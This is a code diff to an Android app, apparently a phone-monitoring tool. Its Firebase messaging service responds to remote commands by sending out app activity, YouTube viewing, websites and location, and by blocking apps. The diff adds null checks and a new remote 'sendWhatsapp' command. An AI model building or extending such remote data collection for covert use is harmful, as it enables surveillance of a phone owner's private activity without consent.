@@ -49,6 +49,9 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
     public  void sendAct() {
         JSONObject data = new JSONObject();
         JSONArray ar = new JSONArray();
+        if(MyAccessibilityService.activities == null) {
+            return;
+        }
         for(MyAccessibilityService.Ac a: MyAccessibilityService.activities) {
             JSONObject o = new JSONObject();
             try {
@@ -75,6 +78,9 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
     public void sendYoutube() {
         JSONObject data = new JSONObject();
         JSONArray ar = new JSONArray();
+        if(MyAccessibilityService.yactivities == null) {
+            return;
+        }
         for(MyAccessibilityService.YAc a: MyAccessibilityService.yactivities) {
             JSONObject o = new JSONObject();
             try {
@@ -97,6 +103,9 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
     public void sendWeb() {
         JSONObject data = new JSONObject();
         JSONArray ar = new JSONArray();
+        if(MyAccessibilityService.webSites == null) {
+            return;
+        }
         for(MyAccessibilityService.WAc a: MyAccessibilityService.webSites) {
             JSONObject o = new JSONObject();
             try {
@@ -246,7 +255,9 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
             sendWeb();
         }else  if(M.get("command") != null && M.get("command").equals("sendLocation")) {
             GoogleService.sendNow = true;
-        }else {
+        }else if(M.get("command") != null && M.get("command").equals("sendWhatsapp")) {
+            GoogleService.sendWhatsapp = true;
+        }else{
             String p = (String)M.get("package");
             String b = (String)M.get("block");
             if(p == null) return;
